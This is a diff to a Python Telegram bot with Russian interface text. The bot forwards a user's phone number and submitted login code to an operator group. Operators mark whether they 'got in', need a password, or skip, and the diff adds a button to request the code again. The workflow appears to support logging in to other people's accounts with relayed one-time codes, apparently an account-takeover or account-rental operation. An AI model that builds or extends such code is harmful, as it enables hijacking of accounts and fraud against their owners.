@@ -540,12 +540,31 @@ def process_code_input(message):
     if order and order[0]:
         thread_id = None
         if hasattr(bot, 'order_threads') and oid in bot.order_threads: thread_id = bot.order_threads[oid]
+        
+        # Добавляем кнопку "Отправил код" для повторного запроса
         markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'), types.InlineKeyboardButton("🔐 Пароль", callback_data=f'code_password_{oid}'), types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}'))
+        markup.add(
+            types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'),
+            types.InlineKeyboardButton("🔐 Пароль", callback_data=f'code_password_{oid}'),
+            types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}')
+        )
+        markup.add(
+            types.InlineKeyboardButton("📤 Отправил код", callback_data=f'send_code_{oid}')
+        )
+        
         send_to_group(
-            f"╭━━━━━━━━━━━━━━━━━━╮\n│  🔑 **ПОЛУЧЕН КОД**  │\n╰━━━━━━━━━━━━━━━━━━╯\n\n"
-            f"📱 Номер: `{order[1]}`\n🔢 Код: `{code}`\n📋 Заявка: #{oid}\n\n✅ Встал — вход выполнен\n🔐 Пароль — запрос пароля\n⏭ Пропустить — проблема",
+            f"╭━━━━━━━━━━━━━━━━━━╮\n"
+            f"│  🔑 ПОЛУЧЕН КОД  │\n"
+            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"📱 Номер: `{order[1]}`\n"
+            f"🔢 Код: `{code}`\n"
+            f"📋 Заявка: #{oid}\n\n"
+            f"✅ Встал — вход выполнен\n"
+            f"🔐 Пароль — запрос пароля\n"
+            f"⏭ Пропустить — проблема\n"
+            f"📤 Отправил код — запросить повторно",
             markup=markup, thread_id=thread_id)
+        
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("◀️ В меню", callback_data='back_to_menu'))
         bot.send_message(message.chat.id, "✅ **Код отправлен!**\n\n📨 Обработчик получил код\n⏱ Ожидайте подтверждение...", parse_mode='Markdown', reply_markup=markup)
